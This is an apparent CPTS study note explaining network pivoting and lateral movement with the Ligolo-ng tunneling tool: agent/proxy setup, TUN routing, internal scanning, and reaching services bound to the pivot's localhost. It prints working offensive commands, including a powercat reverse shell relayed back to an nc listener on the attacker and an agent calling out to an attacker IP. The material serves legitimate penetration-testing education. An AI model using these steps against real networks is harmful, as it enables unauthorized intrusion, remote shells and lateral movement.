# 🔀 Ligolo-ng — Network Pivoting, Tunneling & Lateral Movement

> [!info] 🎯 What This Note Covers  
> **Ligolo-ng** is a tunneling and pivoting tool that allows a penetration tester to route normal IP traffic from an attacking machine through a compromised host into an otherwise unreachable internal network.
> 
> The important idea is not memorizing Ligolo-ng commands. The important idea is understanding:
> 
> **Compromise → discover another network → establish a tunnel → route traffic → enumerate → attack → find another pivot → repeat.**

---

# 1️⃣ 🌐 Lateral Movement vs Pivoting

## 🔹 Lateral Movement

**Lateral movement** is the broader process of moving from one compromised system to another.

Example:

```text
Web Server
    │
    ▼
Internal Windows Server
    │
    ▼
Database Server
    │
    ▼
Domain Controller
```

The attacker uses access to one machine to gain access to additional machines.

---

## 🔹 Pivoting

**Pivoting** is the technique of using a compromised host as a network stepping stone to reach a network or host that the attacker cannot directly reach.

Example:

```text
ATTACKER
10.10.x.x
    │
    │ Can reach
    ▼
PIVOT / DMZ
10.1.1.10
    │
    │ Can reach
    ▼
INTERNAL NETWORK
10.1.2.0/24
```

The attacker may have:

```text
Attacker → 10.1.1.10       ✅
Attacker → 10.1.2.0/24     ❌

Pivot → 10.1.2.0/24        ✅
```

Therefore the pivot becomes the bridge.

> [!important] 🧠 Mental Model  
> A compromised machine is not only a computer you have a shell on.
> 
> It is also a **new network position**.
> 
> Whenever you compromise a host, ask:
> 
> ```text
> What networks can THIS machine reach
> that I cannot reach?
> ```
> 
> Those networks are potential pivot targets.

---

# 2️⃣ 🧱 DMZ → Internal Network

A common penetration-testing scenario is:

```text
                         INTERNET
                            │
                            ▼
                    ┌──────────────┐
                    │      DMZ     │
                    │              │
                    │  Web Server  │
                    │  / Pivot     │
                    └──────┬───────┘
                           │
                           │ Can reach
                           ▼
                    ┌──────────────┐
                    │   INTERNAL   │
                    │    NETWORK   │
                    │              │
                    │ Servers / AD  │
                    │ Databases etc│
                    └──────────────┘
```

The DMZ is often reachable from the public side, while internal systems are protected from direct Internet access.

However, the DMZ machine may itself have access to the internal network.

For example:

```text
Pivot
├── eth0 → 10.1.1.10
└── eth1 → 10.1.2.4
```

This tells us:

```text
10.1.1.0/24  → DMZ
10.1.2.0/24  → Internal
```

The attacker wants:

```text
Kali → Pivot → 10.1.2.0/24
```

instead of:

```text
Kali → 10.1.2.0/24
```

which may fail because Kali has no route to that network.

---

# 3️⃣ ⚡ What Is Ligolo-ng?

> [!info] 🛠️ Ligolo-ng  
> **Ligolo-ng** is a lightweight tunneling/pivoting tool that creates a tunnel between an attacker-controlled **proxy** and an **agent** running on a compromised machine.
> 
> It uses a **TUN interface**, allowing the attacker to route IP traffic through the compromised host.
> 
> The current project provides pre-built binaries for multiple operating systems and architectures. The latest release at the time of these notes is **v0.9.1**.

Ligolo-ng has two primary components:

```text
Proxy
  │
  └── Runs on attacker

Agent
  │
  └── Runs on compromised/pivot machine
```

Architecture:

```text
                 ATTACKER
              Kali Linux
                   │
                   │ TLS tunnel
                   │
                   ▼
             ┌───────────┐
             │   Proxy   │
             └─────┬─────┘
                   │
              TUN interface
                   │
              Encrypted tunnel
                   │
                   ▼
             ┌───────────┐
             │   Agent   │
             │   Pivot   │
             └─────┬─────┘
                   │
                   ▼
            INTERNAL NETWORK
```

---

# 4️⃣ 📥 Downloading Ligolo-ng

The video downloads the **agent** and **proxy** binaries from the GitHub releases page.

For Kali Linux on a normal x86-64 system, the relevant architecture is generally:

```text
linux_amd64
```

> [!tip] 💡 Architecture Check  
> On Kali/Linux you can verify the architecture with:
> 
> ```bash
> uname -m
> ```
> 
> Common results:
> 
> ```text
> x86_64   → amd64
> aarch64  → arm64
> ```
> 
> Do not blindly download `amd64` if you are actually using ARM hardware.

## 🔹 Download the Linux amd64 binaries

Example using the current v0.9.1 release:

```bash
mkdir -p ~/tools/ligolo-ng
cd ~/tools/ligolo-ng

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.1/ligolo-ng_proxy_0.9.1_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.1/ligolo-ng_agent_0.9.1_linux_amd64.tar.gz
```

Extract them:

```bash
tar -xzf ligolo-ng_proxy_0.9.1_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.9.1_linux_amd64.tar.gz
```

Check the files:

```bash
ls -lah
```

You should have the proxy and agent binaries.

Make them executable if necessary:

```bash
chmod +x proxy agent
```

> [!important] 🧠 Proxy vs Agent  
> Do not confuse these:
> 
> ```text
> proxy → attacker machine
> agent → compromised machine
> ```
> 
> You normally **do not put the proxy on the pivot**.
> 
> You put the **agent on the pivot** and the **proxy on Kali**.

---

# 5️⃣ 🧩 Why Ligolo-ng Uses a TUN Interface

This is one of the most important concepts in the entire technique.

A **TUN interface** is a virtual Layer-3 network interface.

Instead of an application connecting to a proxy directly, Linux can send ordinary IP packets into the TUN interface.

Conceptually:

```text
Application
     │
     ▼
Linux Networking Stack
     │
     ▼
Routing Table
     │
     ▼
ligolo TUN interface
     │
     ▼
Ligolo-ng
     │
     ▼
Encrypted tunnel
     │
     ▼
Agent
     │
     ▼
Internal Network
```

This is why tools can often work without ProxyChains.

---

# 6️⃣ 🔌 Create the TUN Interface

The video demonstrates creating the interface manually.

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Replace `kali` with your actual local username if necessary.

Verify:

```bash
ip a
```

You should see:

```text
ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>
```

### 🔍 Breaking Down the Commands

```bash
sudo ip tuntap add user kali mode tun ligolo
```

|Part|Meaning|
|---|---|
|`sudo`|Run with administrative privileges|
|`ip`|Linux networking utility|
|`tuntap`|Manage TUN/TAP interfaces|
|`add`|Create an interface|
|`user kali`|Associate the interface with the specified user|
|`mode tun`|Create a Layer-3 TUN interface|
|`ligolo`|Interface name|

Then:

```bash
sudo ip link set ligolo up
```

means:

```text
Bring the virtual interface UP.
```

> [!info] 🆕 Modern Ligolo-ng  
> Newer Ligolo-ng versions can also create/manage interfaces from the Ligolo-ng console itself using commands such as:
> 
> ```text
> interface_create --name ligolo
> ```
> 
> This means the manual `ip tuntap` method is not the only approach in current versions.
> 
> For CPTS, understand both:
> 
> ```text
> Linux creates interface
> ```
> 
> and:
> 
> ```text
> Ligolo-ng manages interface
> ```
> 
> The underlying concept is the same: **the attacker needs a virtual interface through which internal traffic can be routed.**

---

# 7️⃣ 🔐 TLS and Certificates

Ligolo-ng establishes an encrypted connection between the proxy and agent.

There are several certificate approaches.

### Automatic certificate

The video refers to:

```bash
./proxy -autocert
```

This allows Ligolo-ng to obtain certificates automatically through Let's Encrypt when the environment is configured appropriately.

### Self-signed certificate

For a lab where Internet access is unavailable:

```bash
./proxy -selfcert
```

This generates a self-signed certificate.

The video uses this because its sandbox does not have Internet access.

> [!warning] ⚠️ Lab vs Real Engagement  
> Self-signed certificates are convenient for labs.
> 
> Ignoring certificate validation is specifically intended for testing/debugging situations and exposes the connection to certificate-verification/MITM concerns.
> 
> In an actual engagement, use proper certificate validation rather than automatically copying the lab's `-ignore-cert` approach.

---

# 8️⃣ 🖥️ Start the Ligolo-ng Proxy

On Kali:

```bash
./proxy -selfcert
```

The proxy listens for agent connections.

The default control port is:

```text
11601
```

Conceptually:

```text
Kali
┌────────────────────────────┐
│ Ligolo-ng Proxy            │
│                            │
│ 0.0.0.0:11601              │
└─────────────┬──────────────┘
              │
              │ TLS
              ▼
          Ligolo Agent
```

> [!important] 🧠 Don't Confuse the Ports  
> The `11601` port is the **Ligolo-ng proxy/agent connection**.
> 
> It is not automatically the port of an internal service.
> 
> For example:
> 
> ```text
> 11601 → Ligolo-ng control/tunnel connection
> 3389  → RDP
> 445   → SMB
> 80    → HTTP
> 22    → SSH
> ```

---

# 9️⃣ 🔗 Start the Ligolo-ng Agent

Transfer the **agent** binary to the compromised machine.

For a Linux pivot, one simple transfer method could be:

```bash
scp agent user@PIVOT_IP:/tmp/
```

Then on the pivot:

```bash
chmod +x /tmp/agent
```

Run:

```bash
/tmp/agent -connect <ATTACKER-IP>:11601
```

If using the lab's self-signed certificate:

```bash
/tmp/agent -connect <ATTACKER-IP>:11601 -ignore-cert
```

The connection should establish.

On the proxy, you should see an agent join.

Conceptually:

```text
ATTACKER                              PIVOT
Kali                                  Linux
 │                                      │
 │          TLS connection              │
 │◄─────────────────────────────────────│
 │                                      │
 │       Agent connected                │
 │                                      │
```

> [!important] 🧠 Direction  
> Notice that the **agent initiates the connection to the proxy**.
> 
> This is extremely useful in pivoting because the compromised machine may be able to make an outbound connection to the attacker even when the attacker cannot directly initiate connections into the internal network.

---

# 🔟 🖥️ Select the Agent Session

Once the agent connects:

```text
session
```

Ligolo-ng displays the available agents.

Example conceptually:

```text
1 - pivot-user@pivot
2 - another-host@server
```

Select the appropriate session.

Now your Ligolo-ng console is operating in the context of that agent.

---

# 1️⃣1️⃣ 🔍 Enumerate the Pivot

Before creating routes, inspect the compromised machine.

From the agent session:

```bash
ifconfig
```

You may discover:

```text
lo
127.0.0.1

eth0
10.1.1.10

eth1
10.1.2.4
```

This is the information that tells you **why pivoting is possible**.

The machine sits between:

```text
10.1.1.0/24
       │
       │
    PIVOT
       │
       │
10.1.2.0/24
```

The attacker may only have direct access to:

```text
10.1.1.0/24
```

while the pivot can access:

```text
10.1.2.0/24
```

> [!important] 🧠 This Is the Real Enumeration Step  
> You did not choose `10.1.2.0/24` because Ligolo-ng told you to.
> 
> You discovered it because the **pivot's network configuration revealed it**.
> 
> That distinction is extremely important for CPTS.

---

# 1️⃣2️⃣ 🛣️ Add a Route to the Internal Network

Now configure Kali's routing table.

```bash
sudo ip route add 10.1.2.0/24 dev ligolo
```

This means:

> "Any traffic destined for 10.1.2.0/24 should be sent into the Ligolo-ng TUN interface."

Verify:

```bash
ip route
```

You should see a route similar to:

```text
10.1.2.0/24 dev ligolo
```

The traffic path is now:

```text
Nmap / Browser / RDP / SSH
             │
             ▼
       Kali routing table
             │
             ▼
        ligolo interface
             │
             ▼
       Ligolo-ng tunnel
             │
             ▼
           Pivot
             │
             ▼
      10.1.2.0/24
```

> [!important] 🧠 Why `/24`?  
> The objective is usually not just:
> 
> ```text
> 10.1.2.4
> ```
> 
> That is the pivot's internal address.
> 
> You want access to the **network behind it**:
> 
> ```text
> 10.1.2.0/24
> ```
> 
> so you can discover other hosts.

---

# 1️⃣3️⃣ 🚇 Start the Tunnel

After selecting the agent and configuring the interface/route, start the tunnel.

Depending on Ligolo-ng version, the command may be shown as:

```text
start
```

or the more explicit modern form:

```text
tunnel_start --tun ligolo
```

Current documentation/code uses the `tunnel_start` form for specifying the TUN interface.

The important concept is:

```text
Agent connection
       ≠
Active network tunnel
```

You first establish the agent connection, then start the actual tunnel.

---

# 1️⃣4️⃣ 🧪 Test Connectivity

Try the pivot's internal address:

```bash
ping 10.1.2.4
```

If routing and the tunnel are functioning, the traffic becomes:

```text
Kali
 │
 │ ping 10.1.2.4
 ▼
ligolo
 │
 ▼
Tunnel
 │
 ▼
Pivot
 │
 ▼
10.1.2.4
```

You can also test TCP connectivity:

```bash
nc -nv 10.1.2.4 22
```

or:

```bash
nmap -Pn -p22 10.1.2.4
```

> [!warning] ⚠️ Ping Is Not Always a Good Connectivity Test  
> ICMP may be blocked.
> 
> A failed `ping` does **not automatically mean the pivot failed**.
> 
> Test the actual TCP service you care about as well.

---

# 1️⃣5️⃣ 🔎 Scan the Internal Network

Now the major benefit becomes obvious.

You can run normal Nmap:

```bash
nmap -Pn 10.1.2.0/24
```

You do not need:

```bash
proxychains nmap ...
```

because the Linux routing table already sends the packets through Ligolo-ng.

Example:

```text
10.1.2.5
80/tcp open
```

```text
10.1.2.6
3389/tcp open
```

Now your normal CPTS service methodology begins.

---

# 1️⃣6️⃣ 🌐 Internal Web Server

Suppose Nmap finds:

```text
10.1.2.5:80
```

Because Kali has a route to the internal network, you can simply browse:

```text
http://10.1.2.5
```

Traffic:

```text
Browser
   │
   ▼
10.1.2.5:80
   │
   ▼
Kali routing table
   │
   ▼
ligolo
   │
   ▼
Pivot
   │
   ▼
Internal Web Server
```

No browser proxy configuration is necessary.

---

# 1️⃣7️⃣ 🖥️ Internal RDP

Suppose another host has:

```text
10.1.2.6:3389
```

Use your normal RDP client:

```bash
xfreerdp /v:10.1.2.6
```

The application simply believes it is connecting directly to:

```text
10.1.2.6:3389
```

The routing occurs underneath it.

```text
xfreerdp
   │
   ▼
10.1.2.6:3389
   │
   ▼
ligolo
   │
   ▼
Pivot
   │
   ▼
Windows Server
```

> [!success] 🎯 This Is Why Ligolo-ng Is So Useful  
> You can continue using normal tools:
> 
> ```text
> nmap
> curl
> Firefox
> ssh
> xfreerdp
> smbclient
> impacket tools
> Metasploit
> custom scripts
> ```
> 
> because the **network route**, rather than each individual application, handles the pivot.

---

# 1️⃣8️⃣ 🆚 Ligolo-ng vs ProxyChains

## ProxyChains

```text
Nmap
 │
 ▼
ProxyChains
 │
 ▼
SOCKS
 │
 ▼
Pivot
 │
 ▼
Internal Host
```

The application must be compatible with the proxying method.

## Ligolo-ng

```text
Nmap
 │
 ▼
Linux routing table
 │
 ▼
TUN interface
 │
 ▼
Ligolo-ng
 │
 ▼
Pivot
 │
 ▼
Internal Host
```

The application usually does not need to know about the tunnel.

> [!important] 🧠 The Difference
> 
> **ProxyChains = application-level proxying**
> 
> **Ligolo-ng = network-level routing through a tunnel**
> 
> That is why Ligolo-ng feels much more like having a real network route into the internal environment.

---

# 1️⃣9️⃣ 🔁 Multi-Level Pivoting

Suppose the internal Windows server has another network interface:

```text
Kali
 │
 ▼
Pivot 1
 │
 ▼
Internal Network
 │
 ▼
Windows Server
 │
 ├── Network A
 └── Network B
```

The Windows server may now become the **next pivot**.

The methodology becomes:

```text
Compromise Pivot 1
        ↓
Enumerate interfaces
        ↓
Discover Network 2
        ↓
Pivot into Network 2
        ↓
Enumerate hosts
        ↓
Compromise Pivot 2
        ↓
Discover Network 3
        ↓
Repeat
```

This is the practical connection between **pivoting** and **lateral movement**.

---

# 2️⃣0️⃣ 🔙 Reverse Connections Through the Pivot

Another problem occurs when an internal host cannot connect directly to Kali.

Example:

```text
Internal Windows
      X
      │
      └──────→ Kali
```

But:

```text
Internal Windows
      │
      ▼
    Pivot
      │
      ▼
    Kali
```

is possible.

Ligolo-ng can create a listener on the agent and forward incoming connections back through the tunnel.

---

# 2️⃣1️⃣ 🎧 `listener_add`

The demonstrated concept is:

```text
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```

The important pieces are:

```text
--addr 0.0.0.0:30000
```

The Ligolo agent/pivot listens on:

```text
0.0.0.0:30000
```

Then:

```text
--to 127.0.0.1:10000
```

causes the connection to be forwarded through the tunnel toward the proxy/attacker side.

The traffic path becomes:

```text
INTERNAL WINDOWS
       │
       │ connect to Pivot:30000
       ▼
     PIVOT
       │
       │ Ligolo-ng tunnel
       ▼
     KALI
       │
       ▼
   127.0.0.1:10000
```

> [!important] 🧠 Why Do This?  
> Because the internal machine might be able to reach the pivot but not Kali.
> 
> So instead of trying:
> 
> ```text
> Internal → Kali
> ```
> 
> we make it do:
> 
> ```text
> Internal → Pivot:30000
> ```
> 
> and Ligolo-ng handles the rest.

---

# 2️⃣2️⃣ 🐚 Reverse Shell Example

On Kali:

```bash
nc -lvnp 10000
```

Now Kali is listening on:

```text
127.0.0.1:10000
```

The internal Windows machine connects to the pivot:

```powershell
powercat -c 10.1.2.4 -p 30000 -e powershell
```

The complete path:

```text
              INTERNAL WINDOWS
                     │
                     │ PowerShell
                     │ → 10.1.2.4:30000
                     ▼
                  PIVOT
                     │
                     │ Ligolo-ng
                     ▼
                   KALI
                     │
                     ▼
                :10000
                     │
                     ▼
                    nc
```

The Windows host never needed direct connectivity to Kali.

> [!tip] 🧠 The Universal Pivoting Question  
> Always ask:
> 
> **"Who can reach whom?"**
> 
> Example:
> 
> ```text
> Internal → Pivot     ✅
> Internal → Kali      ❌
> Pivot → Kali         ✅
> ```
> 
> Therefore:
> 
> ```text
> Internal
>     ↓
> Pivot
>     ↓
> Kali
> ```
> 
> is a viable path.

---

# 2️⃣3️⃣ 🏠 Accessing the Pivot's Localhost

There is another useful Ligolo-ng feature: reaching services that are bound only to the pivot's loopback interface.

Normally:

```text
Pivot
└── 127.0.0.1:22
```

is accessible only from the pivot itself.

From Kali:

```text
Kali → Pivot's 127.0.0.1:22
```

doesn't work normally because:

> `127.0.0.1` always means **the local host from the perspective of the machine making the connection**.

Ligolo-ng provides a special address for accessing the agent's local services:

```text
240.0.0.1
```

---

# 2️⃣4️⃣ 🪄 `240.0.0.1` — Ligolo-ng Special Address

Add the route:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

Now traffic destined for:

```text
240.0.0.1
```

is sent through Ligolo-ng.

Ligolo-ng maps this toward the agent's local host.

Conceptually:

```text
Kali
 │
 │ 240.0.0.1
 ▼
ligolo
 │
 ▼
Agent
 │
 ▼
Pivot localhost
 │
 ▼
127.0.0.1
```

The special `/32` route means:

```text
240.0.0.1
```

specifically, not an entire network.

---

# 2️⃣5️⃣ 🔎 Scan Pivot-Local Services

Now:

```bash
nmap 240.0.0.1
```

can be used to identify services exposed only locally on the pivot.

For example:

```text
22/tcp open ssh
```

This could reveal an SSH service listening only on localhost.

> [!important] 🧠 Why This Matters  
> During post-exploitation, don't only inspect services exposed on the machine's external interfaces.
> 
> Also consider:
> 
> ```text
> 127.0.0.1
> ```
> 
> because applications may bind to localhost intentionally, assuming only local processes can access them.
> 
> A pivoting tunnel can sometimes make those services reachable from the attacker.

---

# 2️⃣6️⃣ 🧹 Cleanup

After finishing, remove the TUN interface if you created it manually:

```bash
sudo ip link set ligolo down
sudo ip link delete ligolo
```

If the interface was created through Ligolo-ng itself, use the corresponding interface-management command.

---

# 2️⃣7️⃣ 🧭 Complete Ligolo-ng Methodology

```text
┌──────────────────────────────┐
│ 1. Gain access to a host     │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 2. Enumerate interfaces      │
│    and routes                │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 3. Identify another network  │
│    the host can reach        │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 4. Choose pivoting method    │
│    e.g. Ligolo-ng            │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 5. Create TUN interface      │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 6. Start proxy on attacker   │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 7. Start agent on pivot      │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 8. Select agent session      │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 9. Add route to internal     │
│    network through TUN       │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 10. Start tunnel             │
└──────────────┬───────────────┘
               ↓
┌──────────────────────────────┐
│ 11. Enumerate internal hosts │
└──────────────┬───────────────┘
               ↓
       ┌───────┴────────┐
       ↓                ↓
   Services          New Pivot
       ↓                ↓
  Attack them      Repeat process
```

---

# 2️⃣8️⃣ 🧠 CPTS Methodology: What Should I Think When I See a Pivot?

When you compromise a machine, don't immediately think:

> "Which Ligolo command do I run?"

Think:

### 🔹 1. What did I compromise?

```text
10.1.1.10
```

### 🔹 2. What interfaces does it have?

```text
eth0 → 10.1.1.10
eth1 → 10.1.2.4
```

### 🔹 3. What network did I discover?

```text
10.1.2.0/24
```

### 🔹 4. Can I reach it directly?

```text
Kali → 10.1.2.0/24 ❌
```

### 🔹 5. Can the compromised host reach it?

```text
Pivot → 10.1.2.0/24 ✅
```

### 🔹 6. Therefore, what do I need?

```text
Kali → Pivot → 10.1.2.0/24
```

### 🔹 7. Choose a tunneling method

For example:

```text
Ligolo-ng
Chisel
Sshuttle
SSH
SOCKS
Metasploit
Socat
Netsh
```

### 🔹 8. Establish the path

```text
Kali
 ↓
TUN
 ↓
Tunnel
 ↓
Pivot
 ↓
Internal Network
```

### 🔹 9. Continue normal enumeration

```text
Nmap
 ↓
Open ports
 ↓
Service identification
 ↓
Service enumeration
 ↓
Credentials / vulnerabilities / misconfigurations
 ↓
Initial access
 ↓
Privilege escalation
 ↓
Credential discovery
 ↓
Lateral movement
```

### 🔹 10. Look for another pivot

```text
New Host
   ↓
Interfaces?
   ↓
Routes?
   ↓
New network?
   ↓
Can I reach it?
   ↓
Pivot again
```

---

# 2️⃣9️⃣ 🆚 Pivoting Tool Selection

|Technique|Main Concept|Requires Application Proxying?|Good For|
|---|---|--:|---|
|**Ligolo-ng**|TUN-based routed tunnel|❌ Usually no|Broad internal network access|
|**ProxyChains + SOCKS**|Application-level SOCKS proxy|✅ Yes|Proxy-aware tools|
|**Chisel**|HTTP/WebSocket tunnel + SOCKS/forwarding|Often|Flexible tunneling|
|**SSH `-D`**|Dynamic SOCKS proxy|Usually|SSH-accessible pivot|
|**SSH `-L`**|Local port forwarding|❌|One specific service|
|**SSH `-R`**|Remote port forwarding|❌|Reverse connectivity|
|**Sshuttle**|SSH-based network routing|❌|Routed internal access|
|**Socat**|Socket-to-socket relay|❌|Specific service/port|
|**Netsh portproxy**|Windows TCP forwarding|❌|Windows living-off-the-land|
|**Metasploit SOCKS**|SOCKS through Meterpreter|Usually|Meterpreter pivot|

> [!important] 🎯 Selection Rule  
> Don't memorize a giant list of tools first.
> 
> Start with:
> 
> ```text
> What can reach what?
> ```
> 
> Then:
> 
> ```text
> Do I need ONE service?
>       │
>       ├── YES → port forwarding may be enough
>       │
>       └── NO
>            ↓
>     Do I need MANY internal hosts?
>            │
>            └── YES → routed tunnel / SOCKS
> ```
> 
> If you want normal applications to work without ProxyChains, a TUN/routed solution such as Ligolo-ng is especially useful.

---

# 3️⃣0️⃣ 🧠 The Most Important Mental Model

```text
             COMPROMISED HOST
                    │
          ┌─────────┴─────────┐
          │                   │
       Network A           Network B
          │                   │
          │                   │
       Attacker            Internal
       can reach            network
          │                   │
          └─────────┬─────────┘
                    │
                 PIVOT
                    │
                    ▼
          Make attacker traffic
          follow the pivot's path
                    │
                    ▼
              TUN / Tunnel
                    │
                    ▼
           Internal Network
```

The key idea is:

> **Ligolo-ng turns a compromised host's network access into a usable route from the attacker's machine.**

Once that route exists, you don't stop doing penetration testing.

You simply continue:

```text
                    PIVOT
                      │
                      ▼
              Internal Network
                      │
             ┌────────┼────────┐
             ▼        ▼        ▼
            HTTP     SMB      RDP
             │        │        │
             ▼        ▼        ▼
          Web Enum  SMB Enum  RDP
             │        │        │
             └────────┼────────┘
                      ▼
                 Credentials
                      │
                      ▼
               New Access
                      │
                      ▼
                New Host
                      │
                      ▼
             New Network?
                      │
                     YES
                      │
                      ▼
                   PIVOT
```

> [!success] 🎯 CPTS Takeaway  
> **The tool is not the methodology.**
> 
> The methodology is:
> 
> **Compromise → enumerate → discover network boundaries → determine reachability → choose pivot → establish tunnel → route traffic → enumerate internal hosts → attack services → obtain new access → discover the next pivot → repeat.**
> 
> Ligolo-ng is simply one of the cleanest tools for solving the **network reachability** problem because it gives the attacker a routed TUN interface rather than forcing every application through a SOCKS proxy.
> 
> ```text
> ┌──────────────────────────────────────────┐
> │       CPTS PIVOTING MENTAL MODEL         │
> ├──────────────────────────────────────────┤
> │                                          │
> │  Compromise Host                         │
> │          ↓                               │
> │  Enumerate Interfaces / Routes           │
> │          ↓                               │
> │  Discover New Network                    │
> │          ↓                               │
> │  Determine Who Can Reach What            │
> │          ↓                               │
> │  Choose Pivot Mechanism                  │
> │          ↓                               │
> │  Establish Tunnel                        │
> │          ↓                               │
> │  Route Internal Traffic                  │
> │          ↓                               │
> │  Enumerate Internal Services             │
> │          ↓                               │
> │  Exploit / Authenticate / Escalate       │
> │          ↓                               │
> │  Obtain New Host                         │
> │          ↓                               │
> │  Discover New Network                    │
> │          ↓                               │
> │       PIVOT AGAIN                        │
> │                                          │
> └──────────────────────────────────────────┘
> ```